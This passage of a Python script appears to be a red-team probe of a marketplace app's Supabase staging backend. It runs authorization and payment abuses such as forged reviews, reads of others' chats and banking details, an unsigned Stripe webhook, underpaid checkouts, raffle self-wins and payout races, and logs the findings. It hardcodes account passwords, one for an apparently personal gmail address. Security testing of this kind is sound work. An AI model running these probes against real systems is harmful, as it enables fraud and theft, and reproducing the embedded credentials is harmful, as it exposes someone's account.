    rec("REVIEWS", "buyer INSERT review as buyer2", "buyer", f"http={r['status']}", "identity forge", "P1" if r["ok"] else "INFO", clip(r.get("body")), finding=r["ok"])
    # duplicate
    r2 = rest(
        buyer["jwt"],
        "POST",
        "reviews",
        body={
            "target_id": seller["id"],
            "buyer_id": buyer["id"],
            "stars": 5,
            "comment": "dup",
            "target_type": "seller",
            "order_id": oid,
        },
    )
    rec("REVIEWS", "duplicate review same order", "buyer", f"http={r2['status']}", "dup reputation", "P1" if r["ok"] and r2["ok"] else "INFO", clip(r2.get("body")), finding=r["ok"] and r2["ok"])

    # chat insert into random chat
    chats = rest(buyer["jwt"], "GET", "chats?select=id,user_a,user_b&limit=20", prefer=None)
    rows = chats.get("body") if isinstance(chats.get("body"), list) else []
    foreign = [c for c in rows if buyer["id"] not in (c.get("user_a"), c.get("user_b"))]
    rec("CHAT", "buyer SELECT chats", "buyer", f"http={chats['status']} n={len(rows)} foreign={len(foreign)}", "chat leakage", "P1" if foreign else "INFO", clip(rows[:3]), finding=bool(foreign), title="Buyer listed foreign chats")
    if rows:
        cid = rows[0]["id"]
        r = rest(
            buyer2["jwt"],
            "POST",
            "chat_messages",
            body={"chat_id": cid, "sender_id": buyer2["id"], "receiver_id": seller["id"], "text": "inject", "is_read": False},
        )
        rec("CHAT", "buyer2 INSERT into first visible chat", "buyer2", f"http={r['status']}", "cross-chat", "P1" if r["ok"] else "INFO", clip(r.get("body")), finding=r["ok"])

    # disputes
    r = rest(buyer["jwt"], "GET", "order_disputes?select=*&limit=10", prefer=None)
    drows = r.get("body") if isinstance(r.get("body"), list) else []
    foreign_d = [d for d in drows if buyer["id"] not in (d.get("buyer_id"), d.get("seller_id"))]
    rec("DISPUTES", "buyer SELECT order_disputes", "buyer", f"n={len(drows)} foreign={len(foreign_d)}", "dispute leakage", "P1" if foreign_d else "INFO", clip(drows[:2]), finding=bool(foreign_d))
    if drows:
        did = drows[0]["id"]
        r = rest(buyer2["jwt"], "PATCH", f"order_disputes?id=eq.{did}", body={"status": "resolvida"})
        rec("DISPUTES", "buyer2 PATCH foreign dispute", "buyer2", f"http={r['status']}", "cross-dispute", "P1" if r["ok"] else "INFO", clip(r.get("body")), finding=r["ok"])

    # lives stream keys as buyer
    r = rest(buyer["jwt"], "GET", "lives?select=id,seller_id,mux_stream_key,stream_key,status&limit=5", prefer=None)
    rows = r.get("body") if isinstance(r.get("body"), list) else []
    leak = any(str(x.get("mux_stream_key") or x.get("stream_key") or "").strip() for x in rows)
    rec("LIVE", "buyer SELECT lives stream keys", "buyer", f"n={len(rows)} leak={leak}", "stream key", "P1" if leak else "INFO", clip(rows[:2]), finding=leak, title="Buyer read Mux stream keys")

    # storage list
    r = http("GET", BASE + "/storage/v1/bucket", token=buyer["jwt"], apikey=ANON)
    rec("STORAGE", "buyer list buckets", "buyer", f"http={r['status']}", "storage map", "INFO", clip(r.get("body")))
    # try public object in chat_media
    r = http(
        "GET",
        BASE + "/storage/v1/object/list/chat_media",
        token=buyer["jwt"],
        apikey=ANON,
        body={"prefix": "", "limit": 5},
    )
    rec("STORAGE", "buyer list chat_media root", "buyer", f"http={r['status']}", "object leakage", "P2" if r["ok"] and r.get("body") else "INFO", clip(r.get("body")))
    r = http(
        "POST",
        BASE + "/storage/v1/object/chat_media/chat_uploads/" + seller["id"] + "/rt_d_probe.txt",
        token=buyer["jwt"],
        apikey=ANON,
        extra={"Content-Type": "text/plain", "x-upsert": "true"},
        body=None,
    )
    # body needs raw bytes — redo
    rec("STORAGE", "buyer upload into seller prefix (json body attempt)", "buyer", f"http={r['status']}", "storage write", "INFO", clip(r.get("body")))


def pass1_edges(buyer, seller):
    # refund as buyer
    r = fn(buyer["jwt"], "refund-order", {"order_id": "00000000-0000-0000-0000-000000000001"})
    rec("REFUNDS", "buyer refund-order random id", "buyer", f"http={r['status']}", "refund authz", "INFO", clip(r.get("body")))
    # webhook no sig
    r = http("POST", FN + "stripe-webhook", token=ANON, body={"type": "checkout.session.completed"})
    rec("WEBHOOK", "POST stripe-webhook no signature", "anon", f"http={r['status']}", "forged settle", "P0" if r["ok"] and isinstance(r.get("body"), dict) and r["body"].get("ok") else "INFO", clip(r.get("body")), finding=r["ok"] and isinstance(r.get("body"), dict) and r.get("body", {}).get("ok") is True)
    # mux as buyer
    r = fn(buyer["jwt"], "create-mux-live", {"title": "rt d hostile live"})
    rec("MUX", "buyer create-mux-live", "buyer", f"http={r['status']}", "cost/stream", "P1" if r["ok"] else "INFO", clip(r.get("body")), finding=r["ok"])
    # complete other live
    lives = rest(None, "GET", "lives?select=id,seller_id&limit=1", svc=True, prefer=None)
    lid = None
    if isinstance(lives.get("body"), list) and lives["body"]:
        lid = lives["body"][0]["id"]
    if lid:
        r = fn(buyer["jwt"], "complete-mux-live", {"live_id": lid})
        rec("MUX", "buyer complete-mux-live foreign", "buyer", f"http={r['status']}", "stop others' live", "P1" if r["ok"] else "INFO", clip(r.get("body")), finding=r["ok"])
        r = fn(buyer["jwt"], "livekit-mux-publish", {"step": "token", "live_id": lid})
        rec("LIVEKIT", "buyer livekit token foreign live", "buyer", f"http={r['status']}", "publish hijack", "P1" if r["ok"] else "INFO", clip(r.get("body")), finding=r["ok"])
    # tips
    r = fn(buyer["jwt"], "create-live-tip-checkout", {"seller_id": seller["id"], "amount_eur": 1, "tip_id": "00000000-0000-0000-0000-000000000042", "live_id": lid})
    rec("TIPS", "buyer tip with client tip_id", "buyer", f"http={r['status']}", "tip confusion", "P1" if r["ok"] else "INFO", clip(r.get("body")))
    r = fn(buyer["jwt"], "create-live-tip-checkout", {"seller_id": seller["id"], "amount_eur": 0.01})
    rec("TIPS", "buyer tip 0.01", "buyer", f"http={r['status']}", "min amount", "INFO", clip(r.get("body")))
    r = fn(buyer["jwt"], "create-live-tip-checkout", {"seller_id": seller["id"], "amount_eur": 10000})
    rec("TIPS", "buyer tip 10000 eur", "buyer", f"http={r['status']}", "uncapped tip", "P2" if r["ok"] else "INFO", clip(r.get("body")))
    # delete account
    r = fn(buyer["jwt"], "delete-test-account", {"confirm": "APAGAR TUDO"})
    rec("AUTH", "buyer delete-test-account", "buyer", f"http={r['status']}", "account nuke", "P1" if r["ok"] else "INFO", clip(r.get("body")), finding=r["ok"])
    # ocr ingest
    r = fn(None, "ingest-ocr-reservation", {"live_id": lid or "x", "ocr_line_hash": "abcdefghij", "detected_at": now_iso(), "requested_qty": 99})
    rec("PS/OCR", "anon ingest-ocr no device token", "anon", f"http={r['status']}", "fake reservations", "P1" if r["ok"] else "INFO", clip(r.get("body")), finding=r["ok"])
    # pairing
    r = fn(None, "ps-pairing-claim", {"code": "000000", "device_id": "rt-d"})
    rec("PS/OCR", "anon pairing code 000000", "anon", f"http={r['status']}", "device claim", "P2" if r["ok"] else "INFO", clip(r.get("body")))
    # heartbeat
    r = fn(None, "ps-heartbeat", {"live_id": lid or "x", "device_id": "rt"})
    rec("PS/OCR", "anon heartbeat no token", "anon", f"http={r['status']}", "panel spoof", "INFO", clip(r.get("body")))
    # livekit cleanup
    r = fn(buyer["jwt"], "livekit-egress-cleanup", {})
    rec("LIVEKIT", "buyer livekit-egress-cleanup", "buyer", f"http={r['status']}", "stop egress", "P1" if r["ok"] else "INFO", clip(r.get("body")), finding=r["ok"])
    # sms hook
    r = fn(None, "send-sms-bulkgate", {"phone": "+351912345678", "text": "hi"})
    rec("SMS", "anon send-sms-bulkgate", "anon", f"http={r['status']}", "sms pump", "P1" if r["ok"] and r["status"] != 401 else "INFO", clip(r.get("body")))
    # meta deletion
    r = fn(None, "meta-data-deletion", {"signed_request": "a.b"})
    rec("PRIVACY", "anon meta-data-deletion forged", "anon", f"http={r['status']}", "account deletion", "P1" if r["ok"] and isinstance(r.get("body"), dict) and r["body"].get("url") else "INFO", clip(r.get("body")))
    # connect GET
    r = fn(None, "create-connect-account", None, method="GET")
    rec("PAYOUT", "anon GET create-connect-account", "anon", f"http={r['status']}", "open redirect?", "INFO", clip(r.get("raw"), 200))


def pass1_rpc_blast(buyer, seller):
    names = inventory.get("rpcs") or []
    interesting = [
        n
        for n in names
        if any(
            k in n.lower()
            for k in (
                "wallet",
                "payout",
                "credit",
                "refund",
                "admin",
                "paid",
                "stock",
                "raffle",
                "review",
                "feedback",
                "dispute",
                "nuke",
                "grant",
                "release",
                "settle",
                "convert",
                "winner",
                "iban",
                "payout_details",
                "direct_payment",
            )
        )
    ]
    inventory["rpc_interesting"] = interesting
    for n in interesting[:80]:
        r = rpc(buyer["jwt"], n, {})
        dangerous_ok = r["ok"] and n.lower() not in (
            "batata_get_my_payout_details",
            "batata_seller_direct_payment_details",
        )
        rec(
            "RPC",
            f"buyer EXECUTE {n} empty args",
            "buyer",
            f"http={r['status']}",
            "privileged rpc",
            "P2" if r["ok"] else "INFO",
            clip(r.get("body"), 250),
        )
    # payout details of other seller
    r = rpc(buyer["jwt"], "batata_seller_direct_payment_details", {"p_seller_id": seller["id"]})
    body = r.get("body")
    leaked = False
    if r["ok"] and body:
        s = json.dumps(body)
        leaked = any(k in s.lower() for k in ("iban", "mb_way", "mbway")) and ("PT" in s or "+" in s or any(ch.isdigit() for ch in s))
    rec(
        "PRIVACY",
        "buyer batata_seller_direct_payment_details",
        "buyer",
        f"http={r['status']} leaked_ibanish={leaked}",
        "banking details",
        "P1" if leaked else "INFO",
        clip(body),
        finding=leaked,
        title="Buyer read seller IBAN/MB WAY via RPC without trade",
    )
    r2 = rpc(buyer2_jwt_holder.get("jwt") if False else buyer["jwt"], "batata_get_my_payout_details", {})
    rec("PRIVACY", "buyer get_my_payout_details", "buyer", f"http={r2['status']}", "own banking", "INFO", clip(r2.get("body")))


buyer2_jwt_holder: dict[str, Any] = {}


def pass2_variants(buyer, seller, buyer2, oid, pid, pid_qty1):
    # catalog change after hold — checkout amount
    if oid:
        before = observe_order(oid)
        rest(None, "PATCH", f"products?id=eq.{pid}", body={"price": 0.50}, svc=True)
        r = fn(buyer["jwt"], "create-payment-intent", {"order_id": oid, "buyer_id": buyer["id"], "shipping_method": "hand"})
        amt = (r.get("body") or {}).get("server_amount_cents") if isinstance(r.get("body"), dict) else None
        contract = before.get("contract_unit_cents")
        rec(
            "CONTRACT",
            "seller catalog price drop after hold, then checkout",
            "buyer",
            f"http={r['status']} amt={amt} contract_unit={contract} new_catalog=50",
            "retroactive price" if amt is not None and contract and abs(amt - (int(contract) + 0)) > 400 and amt <= 150 else "contract held or blocked",
            "P1" if r["ok"] and amt is not None and int(contract or 0) > 200 and amt < 150 else "INFO",
            {"amt": amt, "order": before, "resp": clip(r.get("body"))},
        )
        rest(None, "PATCH", f"products?id=eq.{pid}", body={"price": 5.00}, svc=True)

    # seller confirm pago on MB WAY hold then release
    mb = buyer_insert_order(
        buyer["jwt"],
        {
            "product_id": pid,
            "buyer_id": buyer["id"],
            "seller_id": seller["id"],
            "price_total": 8.00,
            "status": "aguarda_confirmacao",
            "payment_method": "MB WAY",
            "quantity": 1,
        },
    )
    mb_id = None
    if mb["ok"]:
        bb = mb["body"]
        mb_id = (bb[0]["id"] if isinstance(bb, list) else bb.get("id")) if bb else None
        if mb_id:
            cleanup_ids["orders"].append(mb_id)
            w0 = observe_wallet(seller["id"])
            p = patch_order(seller["jwt"], mb_id, {"status": "pago"})
            after = observe_order(mb_id)
            rel = rpc(seller["jwt"], "batata_release_seller_wallet_for_order", {"p_order_id": mb_id})
            w1 = observe_wallet(seller["id"])
            minted = float(w1.get("balance") or 0) > float(w0.get("balance") or 0) + 0.01
            rec(
                "WALLET",
                "MB WAY seller marks pago then release wallet",
                "seller",
                f"patch={p['status']} status={after.get('status')} release={clip(rel.get('body'),80)} bal {w0.get('balance')}->{w1.get('balance')}",
                "off-platform mint",
                "P0" if minted else "INFO",
                {"order": after, "rpc": clip(rel.get("body")), "w0": w0, "w1": w1},
                finding=minted,
                title="Seller minted wallet from off-platform pago",
                pre="MB WAY hold aguarda_confirmacao",
            )
            invariants["F_offplatform_mint"] = minted

    # offer: buyer insert accepted offer
    r = rest(
        buyer["jwt"],
        "POST",
        "product_offers",
        body={
            "product_id": pid,
            "buyer_id": buyer["id"],
            "seller_id": seller["id"],
            "amount": 0.50,
            "status": "accepted",
        },
    )
    rec("OFFERS", "buyer INSERT offer status=accepted amount=0.50", "buyer", f"http={r['status']}", "self-accept cheap", "P2" if r["ok"] else "INFO", clip(r.get("body")))

    # live reservation qty
    r = rpc(buyer["jwt"], "batata_live_reservation_request", {"p_live_id": "00000000-0000-0000-0000-000000000001", "p_qty": 99})
    rec("LIVE", "buyer reservation rpc bogus live qty=99", "buyer", f"http={r['status']}", "capacity", "INFO", clip(r.get("body")))

    # reviews_gerais
    r = rest(buyer["jwt"], "POST", "reviews_gerais", body={"stars": 5, "comment": "x", "seller_id": seller["id"]})
    rec("REVIEWS", "buyer INSERT reviews_gerais", "buyer", f"http={r['status']}", "reputation", "P2" if r["ok"] else "INFO", clip(r.get("body")))


def pass3_races(buyer, seller, pid_qty1: str, oid: str | None):
    # two checkout sessions same order
    if oid:
        def ck(_):
            return fn(buyer["jwt"], "create-payment-intent", {"order_id": oid, "buyer_id": buyer["id"], "shipping_method": "hand"})

        outs = []
        with ThreadPoolExecutor(max_workers=6) as ex:
            for f in as_completed([ex.submit(ck, i) for i in range(6)]):
                outs.append(f.result())
        sessions = []
        for r in outs:
            if isinstance(r.get("body"), dict) and r["body"].get("checkoutSessionId"):
                sessions.append({"id": r["body"]["checkoutSessionId"], "amt": r["body"].get("server_amount_cents")})
        races.append({"name": "6 concurrent checkout sessions same order", "created": len(sessions), "sessions": sessions})
        rec(
            "CHECKOUT",
            "6 concurrent Sessions same order",
            "buyer",
            f"created={len(sessions)}",
            "double capture window (sessions, not captures)",
            "P2" if len(sessions) > 1 else "INFO",
            sessions,
        )
        stripe_tests.append({"label": "concurrent_sessions", "count": len(sessions), "ids": sessions})

        # two refunds
        def rf(_):
            return fn(seller["jwt"], "refund-order", {"order_id": oid})

        refs = []
        with ThreadPoolExecutor(max_workers=4) as ex:
            for f in as_completed([ex.submit(rf, i) for i in range(4)]):
                refs.append(f.result())
        rec("REFUNDS", "4 concurrent refund-order on unpaid hold", "seller", f"statuses={[x['status'] for x in refs]}", "dup refund", "INFO", [clip(x.get("body"), 120) for x in refs])

    # two payouts different keys
    def po(i):
        return fn(seller["jwt"], "create-connect-account", {"user_id": seller["id"], "amount": 100, "idempotency_key": f"rt_d_race_payout_{i}_{int(time.time())}"})

    pos = []
    with ThreadPoolExecutor(max_workers=4) as ex:
        for f in as_completed([ex.submit(po, i) for i in range(4)]):
            pos.append(f.result())
    rec("PAYOUT", "4 concurrent payouts different keys amount=100", "seller", f"statuses={[x['status'] for x in pos]}", "dup transfer", "INFO", [clip(x.get("body"), 160) for x in pos])
    races.append({"name": "4 payouts different keys", "results": [clip(x.get("body"), 160) for x in pos]})

    # same idempotency key
    key = "rt_d_same_key_" + "".join(random.choices(string.ascii_lowercase, k=8))
    def po2(_):
        return fn(seller["jwt"], "create-connect-account", {"user_id": seller["id"], "amount": 100, "idempotency_key": key})

    same = []
    with ThreadPoolExecutor(max_workers=4) as ex:
        for f in as_completed([ex.submit(po2, i) for i in range(4)]):
            same.append(f.result())
    rec("PAYOUT", "4 concurrent payouts SAME idempotency key", "seller", f"statuses={[x['status'] for x in same]}", "dup vs idempotent", "INFO", [clip(x.get("body"), 160) for x in same])

    # two reviews race
    def rv(i):
        return rest(
            buyer["jwt"],
            "POST",
            "reviews",
            body={"target_id": seller["id"], "buyer_id": buyer["id"], "stars": 5, "comment": f"race{i}", "target_type": "seller"},
        )

    rvs = []
    with ThreadPoolExecutor(max_workers=6) as ex:
        for f in as_completed([ex.submit(rv, i) for i in range(6)]):
            rvs.append(f.result())
    ok_n = sum(1 for x in rvs if x["ok"])
    rec("REVIEWS", "6 concurrent reviews", "buyer", f"ok={ok_n}", "dup reviews", "P1" if ok_n > 1 else "INFO", [x["status"] for x in rvs], finding=ok_n > 1, title="Concurrent duplicate reviews accepted")

    # storage raw upload
    url = BASE + f"/storage/v1/object/chat_media/chat_uploads/{seller['id']}/rt_d_{int(time.time())}.txt"
    req = urllib.request.Request(
        url,
        data=b"rt-indep-d",
        method="POST",
        headers={
            "Authorization": f"Bearer {buyer['jwt']}",
            "apikey": ANON,
            "Content-Type": "text/plain",
            "x-upsert": "true",
        },
    )
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            st = resp.status
            raw = resp.read()[:300]
    except urllib.error.HTTPError as e:
        st = e.code
        raw = e.read()[:300]
    except Exception as e:
        st = 0
        raw = str(e).encode()
    rec(
        "STORAGE",
        "buyer POST object into seller chat_uploads prefix",
        "buyer",
        f"http={st}",
        "cross-user storage write",
        "P1" if st in (200, 201) else "INFO",
        clip(raw.decode("utf-8", "replace") if isinstance(raw, (bytes, bytearray)) else raw),
        finding=st in (200, 201),
        title="Buyer wrote into another user's storage prefix",
    )


def pass3_composition(buyer, seller, pid, pid_qty1, oid):
    # bag + two products qty
    p2 = create_product(seller["id"], qty=1, price=7.0, title=f"RT-D bag B {int(time.time())}")
    o1 = buyer_insert_order(buyer["jwt"], {"product_id": pid, "buyer_id": buyer["id"], "seller_id": seller["id"], "price_total": 5, "status": "reserva_pendente", "quantity": 1, "payment_method": "Pagamento na App", "shipping_method": "hand"})
    o2 = buyer_insert_order(buyer["jwt"], {"product_id": p2, "buyer_id": buyer["id"], "seller_id": seller["id"], "price_total": 7, "status": "reserva_pendente", "quantity": 1, "payment_method": "Pagamento na App", "shipping_method": "hand"})
    ids = []
    for r in (o1, o2):
        if r["ok"]:
            bb = r["body"]
            i = (bb[0]["id"] if isinstance(bb, list) else bb.get("id")) if bb else None
            if i:
                ids.append(i)
                cleanup_ids["orders"].append(i)
    if len(ids) == 2:
        r = fn(
            buyer["jwt"],
            "create-payment-intent",
            {
                "buyer_id": buyer["id"],
                "order_id": ids[0],
                "bag_checkout": True,
                "shipping_method": "hand",
                "bag_lines": [{"order_id": ids[0], "line_total_cents": 1}, {"order_id": ids[1], "line_total_cents": 1}],
            },
        )
        amt = (r.get("body") or {}).get("server_amount_cents") if isinstance(r.get("body"), dict) else None
        rec("COMPOSITION", "bag two SKUs client line_total=1c", "buyer", f"http={r['status']} amt={amt}", "bag underpay", "P0" if r["ok"] and amt is not None and amt < 500 else "INFO", clip(r.get("body")), finding=bool(r["ok"] and amt is not None and amt < 500), title="Bag checkout charged far below catalog")

    # dispute insert
    if oid:
        r = rest(
            buyer["jwt"],
            "POST",
            "order_disputes",
            body={"order_id": oid, "buyer_id": buyer["id"], "seller_id": seller["id"], "status": "aberta", "reason": "rt-d"},
        )
        rec("DISPUTES", "buyer INSERT dispute on unpaid hold", "buyer", f"http={r['status']}", "dispute without capture", "P2" if r["ok"] else "INFO", clip(r.get("body")))

    # raffle winner insert
    r = rest(buyer["jwt"], "POST", "live_raffle_winners", body={"user_id": buyer["id"], "raffle_id": "00000000-0000-0000-0000-000000000001"})
    rec("RAFFLES", "buyer INSERT live_raffle_winners", "buyer", f"http={r['status']}", "self-win", "P1" if r["ok"] else "INFO", clip(r.get("body")), finding=r["ok"])

    # prize order insert
    r = buyer_insert_order(
        buyer["jwt"],
        {
            "product_id": pid,
            "buyer_id": buyer["id"],
            "seller_id": seller["id"],
            "price_total": 0,
            "status": "premio_rifa",
            "payment_method": "premio_rifa",
            "quantity": 1,
        },
    )
    rec("RAFFLES", "buyer INSERT status=premio_rifa", "buyer", f"http={r['status']}", "fake prize shipping checkout", "P1" if r["ok"] else "INFO", clip(r.get("body")), finding=r["ok"])
    if r["ok"]:
        bb = r["body"]
        pid_ord = (bb[0]["id"] if isinstance(bb, list) else bb.get("id")) if bb else None
        if pid_ord:
            cleanup_ids["orders"].append(pid_ord)
            c = fn(buyer["jwt"], "create-payment-intent", {"order_id": pid_ord, "buyer_id": buyer["id"], "prize_shipping": True, "shipping_method": "carrier"})
            rec("RAFFLES", "checkout prize_shipping on self-inserted premio_rifa", "buyer", f"http={c['status']}", "ports-only prize fraud", "P1" if c["ok"] else "INFO", clip(c.get("body")), finding=c["ok"], title="Prize shipping checkout on forged premio_rifa order")


def cleanup(seller):
    for pid in cleanup_ids["products"]:
        rest(None, "PATCH", f"products?id=eq.{pid}", body={"list_on_marketplace": False, "is_sold": True}, svc=True)
    for oid in cleanup_ids["orders"]:
        rest(None, "PATCH", f"orders?id=eq.{oid}", body={"status": "cancelado"}, svc=True)


def dump():
    payload = {
        "project": STAGING_REF,
        "frozen_at_partial": now_iso(),
        "inventory": inventory,
        "matrix": matrix,
        "findings": findings,
        "invariants": invariants,
        "races": races,
        "stripe_tests": stripe_tests,
        "gaps": gaps,
        "cleanup_ids": cleanup_ids,
    }
    (OUT_DIR / "probe_raw.json").write_text(json.dumps(payload, ensure_ascii=False, indent=2, default=str), encoding="utf-8")


def main():
    global ANON, SVC
    env = load_env(ENV_PATH)
    ANON = env["SUPABASE_ANON_KEY"]
    SVC = env["SUPABASE_SERVICE_ROLE_KEY"]
    if STAGING_REF not in env.get("SUPABASE_URL", BASE):
        # url field is rest path; still staging keys
        pass
    print("sign-in...", flush=True)
    buyer = sign_in(env["LIVE_OPS_TEST_BUYER_EMAIL"], env["LIVE_OPS_TEST_BUYER_PASSWORD"])
    seller = sign_in(env["LIVE_OPS_TEST_SELLER_EMAIL"], env["LIVE_OPS_TEST_SELLER_PASSWORD"])
    # second buyer
    buyer2 = None
    for email, pw in [
        ("demo_bot_01@staging.fleaber.bot", "FleaberBotSim_Staging_2026!"),
        ("agostinhomarina334@gmail.com", "Testeteste"),
    ]:
        try:
            buyer2 = sign_in(email, pw)
            if buyer2["id"] not in (buyer["id"], seller["id"]):
                break
        except Exception:
            buyer2 = None
    if not buyer2:
        # signup disposable
        rnd = "rtd" + "".join(random.choices(string.ascii_lowercase, k=8)) + "@staging.fleaber.bot"
        su = http("POST", AUTH + "signup", token=ANON, body={"email": rnd, "password": "Testeteste1!"})
        if su["ok"] and isinstance(su.get("body"), dict) and su["body"].get("access_token"):
            buyer2 = {"jwt": su["body"]["access_token"], "id": su["body"]["user"]["id"], "email": rnd}
        else:
            buyer2 = buyer  # fallback same identity — documented gap
            gaps.append("no distinct buyer2; some cross-user tests reused buyer")
    buyer2_jwt_holder.update(buyer2)
    print(f"buyer={buyer['id']} seller={seller['id']} buyer2={buyer2['id']}", flush=True)

    print("inventory...", flush=True)
    pass1_inventory()
    dump()
    print("anon rls...", flush=True)
    pass1_anon_rls()
    dump()
    print("auth...", flush=True)
    pass1_auth_jwt(buyer, seller, buyer2)
    dump()

    print("fixtures...", flush=True)
    pid_cheap = create_product(seller["id"], qty=5, price=5.00, title=f"RT-D cheap {int(time.time())}")
    pid_qty1 = create_product(seller["id"], qty=1, price=6.00, title=f"RT-D qty1 {int(time.time())}")
    print(f"products {pid_cheap} {pid_qty1}", flush=True)

    print("orders...", flush=True)
    oid = pass1_orders_money(buyer, seller, buyer2, pid_cheap, pid_qty1)
    dump()
    print("checkout...", flush=True)
    pass1_checkout(buyer, seller, oid, pid_cheap)
    dump()
    print("wallet...", flush=True)
    pass1_wallet(buyer, seller, oid)
    dump()
    print("stock...", flush=True)
    pass1_stock(buyer, seller, pid_qty1)
    dump()
    print("privacy...", flush=True)
    pass1_reviews_chat_privacy(buyer, seller, buyer2, oid)
    dump()
    print("edges...", flush=True)
    pass1_edges(buyer, seller)
    dump()
    print("rpc blast...", flush=True)
    pass1_rpc_blast(buyer, seller)
    dump()
    print("pass2...", flush=True)
    pass2_variants(buyer, seller, buyer2, oid, pid_cheap, pid_qty1)
    dump()
    print("pass3 races...", flush=True)
    pass3_races(buyer, seller, pid_qty1, oid)
    dump()
    print("pass3 composition...", flush=True)
    pass3_composition(buyer, seller, pid_cheap, pid_qty1, oid)
    dump()
    print("cleanup...", flush=True)
    cleanup(seller)
    dump()
    print(f"DONE findings={len(findings)} matrix={len(matrix)}", flush=True)
    print(json.dumps({"findings": [{"id": f["id"], "sev": f["severity"], "title": f["title"]} for f in findings]}, indent=2))


if __name__ == "__main__":
    try:
        main()
    except Exception:
        traceback.print_exc()
        dump()
        sys.exit(1)
